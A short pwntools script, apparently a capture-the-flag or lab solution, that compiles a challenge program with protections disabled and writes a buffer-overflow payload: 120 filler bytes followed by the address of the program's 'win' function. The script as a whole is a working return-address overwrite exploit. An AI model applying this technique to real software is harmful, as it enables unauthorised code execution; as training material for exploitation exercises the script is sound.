from pwn import p64, ELF, context
import subprocess

# Buffer overflow etapa 1: offset descoberto com cyclic = 120.
context.log_level = "error"
subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-no-pie",
     "/challenge/vuln.c", "-o", "/tmp/vuln_solve"],
    check=True,
)
win = ELF("/tmp/vuln_solve").symbols["win"]

offset = 120
payload = b"A" * offset + p64(win)
open("/home/hacker/payload.bin", "wb").write(payload)
